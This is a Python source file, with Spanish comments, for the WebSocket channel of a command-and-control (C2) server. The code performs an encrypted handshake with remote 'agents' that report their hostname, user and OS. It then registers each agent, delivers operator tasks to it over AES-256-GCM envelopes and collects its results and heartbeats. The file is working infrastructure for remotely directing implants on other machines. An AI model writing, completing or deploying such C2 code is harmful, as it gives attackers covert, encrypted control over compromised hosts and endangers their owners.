"""
channels/websocket.py — Canal principal del C2.

Implementa el ciclo completo handshake + sesión sobre WebSocket usando
FastAPI/Starlette. Cada conexión vive en una corutina y se compone de:

    1. Recibe HELLO (en claro, con pub key del agente).
    2. Responde HANDSHAKE con server_pub_pem + challenge + agent_id.
    3. Recibe HANDSHAKE del agente con session_key envuelta + challenge_ack.
    4. A partir de ahí, cada mensaje viaja como envelope AES-256-GCM.

Pub/sub: el server desacopla el receive del send. Una tarea consume
`agent.outbox` y empuja al socket; otra consume del socket y despacha al
manager. El operador "publica" tasks y se entregan en milisegundos.
"""

from __future__ import annotations

import asyncio
import logging
import os

from fastapi import WebSocket, WebSocketDisconnect

from .. import crypto, protocol
from ..agent_manager import AgentManager
from ..protocol import (
    HandshakeAgentPayload,
    HandshakeServerPayload,
    HelloPayload,
    Message,
    MessageType,
)

logger = logging.getLogger("c2.ws")


class WebSocketChannel:
    def __init__(self, manager: AgentManager, server_priv, server_pub_pem: bytes) -> None:
        self.manager = manager
        self.server_priv = server_priv
        self.server_pub_pem = server_pub_pem

    # ------------------------------------------------------------------
    # Handshake
    # ------------------------------------------------------------------

    async def _handshake(self, ws: WebSocket) -> tuple[str, bytes] | None:
        # 1. HELLO
        raw = await ws.receive_text()
        hello = Message.from_wire(raw)
        if hello.type != MessageType.HELLO:
            await ws.send_text(Message(type=MessageType.ERROR, payload={
                "code": "EXPECT_HELLO", "message": "First message must be HELLO"
            }).to_wire())
            return None
        hello_payload = HelloPayload(**hello.payload)
        label_str = f" [{hello_payload.label}]" if hello_payload.label else ""
        logger.info("HELLO from %s@%s (%s)%s", hello_payload.user, hello_payload.hostname, hello_payload.os, label_str)

        # 2. server HANDSHAKE
        challenge = crypto.b64e(os.urandom(32))
        # asignamos agent_id provisional para que el agente nos lo eche en HANDSHAKE
        provisional_id = crypto.b64e(os.urandom(8))
        server_hs = Message(
            type=MessageType.HANDSHAKE,
            payload=HandshakeServerPayload(
                server_pub_pem=self.server_pub_pem.decode("ascii"),
                agent_id=provisional_id,
                challenge=challenge,
            ).model_dump(),
        )
        await ws.send_text(server_hs.to_wire())

        # 3. agent HANDSHAKE con session_key + challenge_ack
        raw = await ws.receive_text()
        agent_hs = Message.from_wire(raw)
        if agent_hs.type != MessageType.HANDSHAKE:
            return None
        ag_payload = HandshakeAgentPayload(**agent_hs.payload)
        wrapped = crypto.b64d(ag_payload.wrapped_session_key)
        session_key = crypto.unwrap_session_key(self.server_priv, wrapped)
        expected_ack = crypto.sign(session_key, challenge.encode("ascii"))
        if expected_ack != ag_payload.challenge_ack:
            logger.warning("Handshake challenge mismatch — rejecting agent")
            await ws.send_text(Message(type=MessageType.ERROR, payload={
                "code": "BAD_CHALLENGE", "message": "Challenge ACK invalid"
            }).to_wire())
            return None

        # 4. Registramos al agente con su agent_id definitivo
        state = await self.manager.register(
            hostname=hello_payload.hostname,
            os_name=hello_payload.os,
            arch=hello_payload.arch,
            user=hello_payload.user,
            capabilities=hello_payload.capabilities,
            session_key=session_key,
            label=hello_payload.label,
        )

        # confirmamos al agente con su agent_id real (cifrado ya con sesión)
        welcome = Message(
            type=MessageType.HANDSHAKE,
            agent_id=state.agent_id,
            payload={"ok": True, "agent_id": state.agent_id},
        )
        await self._send_encrypted(ws, state.session_key, welcome)
        return state.agent_id, state.session_key

    # ------------------------------------------------------------------
    # Cifrado de envoltura sobre el WS
    # ------------------------------------------------------------------

    async def _send_encrypted(self, ws: WebSocket, key: bytes, msg: Message) -> None:
        body = msg.to_bytes_for_signature()
        env = crypto.encrypt(key, body, aad=msg.id.encode("ascii"))
        msg.sig = crypto.sign(key, body)
        wire = {
            "id": msg.id,
            "type": msg.type.value,
            "agent_id": msg.agent_id,
            "ts": msg.ts,
            "sig": msg.sig,
            "envelope": env.to_dict(),
        }
        import json as _json
        await ws.send_text(_json.dumps(wire))

    async def _recv_encrypted(self, ws: WebSocket, key: bytes) -> Message | None:
        import json as _json
        raw = await ws.receive_text()
        wire = _json.loads(raw)
        env = crypto.Envelope.from_dict(wire["envelope"])
        try:
            body = crypto.decrypt(key, env)
        except Exception as exc:
            logger.warning("Decrypt failed: %s", exc)
            return None
        msg = Message.model_validate_json(body)
        if not crypto.verify_signature(key, msg.to_bytes_for_signature(), wire.get("sig", "")):
            logger.warning("Bad signature on msg %s", msg.id)
            return None
        return msg

    # ------------------------------------------------------------------
    # Loop principal por conexión
    # ------------------------------------------------------------------

    async def serve(self, ws: WebSocket) -> None:
        await ws.accept()
        result = await self._handshake(ws)
        if result is None:
            await ws.close(code=1008)
            return
        agent_id, session_key = result
        logger.info("Agent %s registered & encrypted", agent_id)

        sender = asyncio.create_task(self._sender_loop(ws, agent_id, session_key))
        try:
            while True:
                msg = await self._recv_encrypted(ws, session_key)
                if msg is None:
                    break
                await self._dispatch(msg)
        except WebSocketDisconnect:
            logger.info("Agent %s disconnected", agent_id)
        finally:
            sender.cancel()
            await self.manager.disconnect(agent_id)

    async def _sender_loop(self, ws: WebSocket, agent_id: str, key: bytes) -> None:
        try:
            while True:
                msg = await self.manager.next_task(agent_id)
                if msg is None:
                    await asyncio.sleep(0.5)
                    continue
                msg.agent_id = agent_id
                await self._send_encrypted(ws, key, msg)
        except asyncio.CancelledError:
            return
        except Exception as exc:
            logger.warning("Sender loop for %s died: %s", agent_id, exc)

    async def _dispatch(self, msg: Message) -> None:
        if msg.type == MessageType.HEARTBEAT:
            await self.manager.handle_heartbeat(msg.agent_id, msg.payload)
        elif msg.type == MessageType.RESULT:
            await self.manager.handle_result(msg.agent_id, msg.payload)
        elif msg.type == MessageType.EVENT:
            await self.manager.handle_event(msg.agent_id, msg.payload)
        elif msg.type == MessageType.BYE:
            await self.manager.disconnect(msg.agent_id)
        elif msg.type == MessageType.ERROR:
            logger.warning("Agent %s reported error: %s", msg.agent_id, msg.payload)
